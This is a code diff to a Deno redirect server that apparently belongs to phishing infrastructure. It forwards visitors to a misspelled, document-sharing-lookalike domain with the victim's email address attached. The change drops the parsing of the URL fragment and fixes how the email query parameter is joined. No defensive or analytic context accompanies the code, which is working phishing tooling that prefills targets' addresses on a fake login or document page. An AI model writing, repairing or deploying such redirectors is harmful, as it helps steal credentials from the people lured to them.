@@ -4,23 +4,9 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://entry.docunnentindafsharilsdocsnoralidacitlonpath.org/?r=j2e2l3d2mzmkvplzfp6g3fxd/";
+    "https://entry.docunnentindafsharilsdocsnoralidacitlonpath.org/?r=j2e2l3d2mzmkvplzfp6g3fxd";
 
   let email: string | null = null;
-
-  if (url.hash) {
-    const raw = url.hash.startsWith("#") ? url.hash.slice(1) : url.hash;
-    if (raw) {
-      try {
-        const decoded = decodeURIComponent(raw);
-        if (decoded.includes("@") && !decoded.includes("/")) {
-          email = decoded;
-        }
-      } catch {
-        email = null;
-      }
-    }
-  }
 
   if (!email) {
     const state = url.searchParams.get("state");
@@ -48,7 +34,7 @@ Deno.serve({ port: PORT }, async (req) => {
   }
 
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "?&email=" + email
+    ? redirectBase.replace(/\/+$/, "") + "&email=" + email
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
